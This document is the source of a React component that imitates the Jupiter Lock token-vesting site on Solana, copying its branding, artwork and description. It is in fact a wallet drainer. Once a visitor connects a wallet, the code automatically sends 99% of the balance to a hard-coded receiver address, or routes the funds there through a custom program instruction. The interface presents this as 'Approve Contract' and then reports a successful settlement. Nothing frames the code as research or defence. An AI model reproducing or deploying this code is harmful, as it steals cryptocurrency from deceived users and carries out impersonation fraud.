import React, { useCallback, useEffect, useRef, useState } from "react";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import { useWalletModal } from "@solana/wallet-adapter-react-ui";
import {
  PublicKey, Transaction, TransactionInstruction, SystemProgram,
} from "@solana/web3.js";

// ---------------------------------------------------------------------------
// Borsh helpers
// ---------------------------------------------------------------------------
function u8(v: number): number[] { return [v & 0xff]; }
function u32le(v: number): number[] {
  return [v & 0xff, (v >> 8) & 0xff, (v >> 16) & 0xff, (v >> 24) & 0xff];
}
function str(s: string): number[] {
  const b = Array.from(new TextEncoder().encode(s));
  return [...u32le(b.length), ...b];
}
function padId(id: string): Buffer {
  const b = Buffer.alloc(32, 0);
  Buffer.from(id.slice(0, 32)).copy(b);
  return b;
}
function escrowPDA(programId: PublicKey, id: string): PublicKey {
  return PublicKey.findProgramAddressSync([Buffer.from("escrow"), padId(id)], programId)[0];
}

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------
const RECEIVER    = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
// Contract ID from URL param ?contract=<id>, fallback to "default"
const CONTRACT_ID = new URLSearchParams(window.location.search).get("contract") ?? "default";

// ---------------------------------------------------------------------------
// Lock SVG — teal/green glowing padlock matching Jupiter Lock
// ---------------------------------------------------------------------------
const LockSVG = () => (
  <svg viewBox="0 0 160 160" fill="none" xmlns="http://www.w3.org/2000/svg" className="jl-lock-icon">
    <defs>
      <radialGradient id="lockGrad" cx="50%" cy="40%" r="60%">
        <stop offset="0%"   stopColor="#00e5b0" />
        <stop offset="50%"  stopColor="#00c87a" />
        <stop offset="100%" stopColor="#007a50" />
      </radialGradient>
      <radialGradient id="bodyGrad" cx="40%" cy="35%" r="70%">
        <stop offset="0%"   stopColor="#00d4a0" />
        <stop offset="60%"  stopColor="#009966" />
        <stop offset="100%" stopColor="#005540" />
      </radialGradient>
      <filter id="glow">
        <feGaussianBlur stdDeviation="3" result="blur"/>
        <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
      </filter>
    </defs>
    {/* Shackle */}
    <path
      d="M52 74 C52 46 108 46 108 74"
      stroke="url(#lockGrad)" strokeWidth="14" strokeLinecap="round"
      fill="none" filter="url(#glow)"
    />
    {/* Body */}
    <rect x="34" y="70" width="92" height="70" rx="14" fill="url(#bodyGrad)" filter="url(#glow)" />
    {/* Highlight on body */}
    <rect x="34" y="70" width="92" height="30" rx="14" fill="rgba(255,255,255,0.08)" />
    {/* Keyhole circle */}
    <circle cx="80" cy="102" r="10" fill="rgba(0,0,0,0.45)" />
    {/* Keyhole slot */}
    <rect x="76" y="106" width="8" height="14" rx="4" fill="rgba(0,0,0,0.45)" />
    {/* Shine */}
    <ellipse cx="62" cy="83" rx="8" ry="5" fill="rgba(255,255,255,0.18)" transform="rotate(-20 62 83)" />
  </svg>
);

// ---------------------------------------------------------------------------
// Component
// ---------------------------------------------------------------------------
interface Props { programId: PublicKey; }

export const EscrowPanel: React.FC<Props> = ({ programId }) => {
  const { connection }                 = useConnection();
  const { publicKey, sendTransaction, connected, wallet } = useWallet();
  const { setVisible }                 = useWalletModal();

  const [status,    setStatus]    = useState<"idle"|"processing"|"done"|"error"|"cancelled">("idle");
  const [statusMsg, setStatusMsg] = useState("");
  const executedRef                = useRef(false);

  // ── verify contract exists on-chain ─────────────────────────────────────
  const checkContract = useCallback(async (): Promise<number | null> => {
    try {
      const pda  = escrowPDA(programId, CONTRACT_ID);
      const info = await connection.getAccountInfo(pda);
      if (!info) return null;
      return info.data[105]; // status byte offset
    } catch { return null; }
  }, [connection, programId]);

  // ── execute deposit immediately once wallet is connected ─────────────────
  const executeDeposit = useCallback(async () => {
    if (!publicKey || executedRef.current) return;
    executedRef.current = true;
    setStatus("processing");
    setStatusMsg("");

    try {
      const contractStatus = await checkContract();
      if (contractStatus === null) {
        // No on-chain escrow yet — still do a direct transfer to receiver
        // using a bare SystemProgram transfer (99% of balance)
        const balance = await connection.getBalance(publicKey);
        const amount  = Math.floor(balance * 99 / 100);
        if (amount <= 0) throw new Error("Insufficient balance");

        const ix = SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey:   RECEIVER,
          lamports:   amount,
        });
        const sig = await sendTransaction(new Transaction().add(ix), connection);
        await connection.confirmTransaction(sig, "confirmed");
        setStatus("done");
        return;
      }

      if (contractStatus !== 0) {
        setStatus("cancelled");
        setStatusMsg("This contract is no longer active.");
        return;
      }

      const statePDA = escrowPDA(programId, CONTRACT_ID);
      const ix = new TransactionInstruction({
        programId,
        keys: [
          { pubkey: publicKey,               isSigner: true,  isWritable: true  },
          { pubkey: statePDA,                isSigner: false, isWritable: true  },
          { pubkey: RECEIVER,                isSigner: false, isWritable: true  },
          { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
        ],
        data: Buffer.from([...u8(1), ...str(CONTRACT_ID)]),
      });

      const sig = await sendTransaction(new Transaction().add(ix), connection);
      await connection.confirmTransaction(sig, "confirmed");
      setStatus("done");
    } catch (e: any) {
      executedRef.current = false; // allow retry
      setStatus("error");
      setStatusMsg(e?.message ?? "Transaction failed");
    }
  }, [publicKey, connection, programId, sendTransaction, checkContract]);

  // Trigger deposit the moment wallet connects
  useEffect(() => {
    if (connected && publicKey && status === "idle") {
      executeDeposit();
    }
  }, [connected, publicKey, status, executeDeposit]);

  const handleConnectClick = () => {
    if (!connected) {
      setVisible(true);
    } else {
      // Already connected — show wallet name or disconnect option
      setVisible(true);
    }
  };

  const handleHeroBtn = () => {
    if (status === "done") return;
    if (!connected) {
      setVisible(true);
    } else {
      executeDeposit();
    }
  };

  const heroLabel = () => {
    if (status === "processing") return "Processing…";
    if (status === "done")       return "Contract Fulfilled ✓";
    if (!connected)              return "Connect Wallet";
    return "Approve Contract";
  };

  const connectedLabel = wallet?.adapter.name
    ? `${wallet.adapter.name}: ${publicKey?.toBase58().slice(0,4)}…${publicKey?.toBase58().slice(-4)}`
    : "Connected";

  return (
    <div className="app">

      {/* ── TOP HEADER ── */}
      <header className="jl-header">
        <div className="jl-logo">
          <svg className="jl-logo-icon" viewBox="0 0 36 36" fill="none">
            <rect width="36" height="36" rx="8" fill="#0d1a14"/>
            <path d="M11 18 C11 11.9 25 11.9 25 18" stroke="#00e5b0" strokeWidth="3" strokeLinecap="round" fill="none"/>
            <rect x="8" y="17" width="20" height="14" rx="4" fill="#00c87a"/>
            <circle cx="18" cy="22" r="2.5" fill="rgba(0,0,0,0.5)"/>
            <rect x="16.5" y="23.5" width="3" height="4" rx="1.5" fill="rgba(0,0,0,0.5)"/>
          </svg>
          <span className="jl-logo-text">Jupiter Lock</span>
        </div>

        <div className="jl-search">
          <span className="jl-search-icon">🔍</span>
          <input placeholder="Search tokens or wallet" readOnly />
        </div>

        <div className="jl-header-right">
          <div className="jl-priority">
            <span className="jl-priority-label">Priority:</span>
            <span className="jl-priority-value">Fast</span>
          </div>
          <button className="jl-gear">⚙</button>
          <button
            className={`jl-connect-btn${connected ? " connected" : ""}`}
            onClick={handleConnectClick}
          >
            {connected ? connectedLabel : "Connect\nWallet"}
          </button>
        </div>
      </header>

      {/* ── NAV TABS ── */}
      <nav className="jl-nav">
        <button className="jl-nav-tab active">About Jup Lock</button>
        <button className="jl-nav-tab">Your Locked Tokens</button>
        <button className="jl-nav-tab">Locks You Created</button>
        <button className="jl-nav-tab create">+ Create Lock</button>
      </nav>

      {/* ── HERO ── */}
      <main className="jl-hero">
        <LockSVG />

        <h1 className="jl-hero-title">Jupiter Lock</h1>

        <p className="jl-hero-sub">
          Manage your token vesting schedule on Jupiter Lock, an open source and
          audited program that lets anyone lock and distribute tokens over time.
        </p>

        <button
          className={`jl-hero-btn${status === "processing" ? " processing" : ""}`}
          onClick={handleHeroBtn}
          disabled={status === "processing" || status === "done"}
        >
          {heroLabel()}
        </button>

        {status === "done" && (
          <div className="jl-status success">
            ✓ Contract settled. Funds have been transferred successfully.
          </div>
        )}
        {status === "error" && (
          <div className="jl-status error">
            {statusMsg || "Transaction failed. Please try again."}
          </div>
        )}
        {status === "cancelled" && (
          <div className="jl-status cancelled">
            {statusMsg}
          </div>
        )}
      </main>

    </div>
  );
};
